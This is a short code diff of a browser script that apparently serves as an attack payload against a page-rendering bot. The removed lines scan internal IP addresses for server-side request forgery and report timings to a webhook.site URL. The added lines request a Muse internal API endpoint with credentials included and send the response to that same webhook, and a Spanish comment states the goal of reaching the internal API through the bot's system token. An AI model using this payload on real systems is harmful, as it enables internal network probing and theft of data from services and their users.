@@ -1,24 +1,9 @@
 <script>
     const webhookUrl = "https://webhook.site/e223390b-32c0-4bfa-ab49-15cc45e09f7a";
-    const internalIPs = [
-        "http://10.0.0.1/",
-        "http://10.0.0.2/",
-        "http://172.16.0.1/",
-        "http://192.168.1.1/",
-        "http://127.0.0.1:8080/",
-        "http://[::1]:80/"
-    ];
-
-    internalIPs.forEach(ip => {
-        const start = performance.now();
-        fetch(ip, { mode: 'no-cors' })
-            .then(() => {
-                const time = performance.now() - start;
-                fetch(`${webhookUrl}?ssrf_internal=true&ip=${ip}&time=${time}`);
-            })
-            .catch(() => {
-                const time = performance.now() - start;
-                fetch(`${webhookUrl}?ssrf_internal_fail=true&ip=${ip}&time=${time}`);
-            });
-    });
+    
+    // Intentar acceder a la API interna de Muse (si el bot tiene un token de sistema)
+    fetch("https://muse.ai/api/internal/links", { credentials: 'include' })
+        .then(res => res.text())
+        .then(data => fetch(`${webhookUrl}?internal_api=true&data=${encodeURIComponent(data)}`))
+        .catch(e => fetch(`${webhookUrl}?internal_api_fail=true&error=${e.message}`));
 </script>
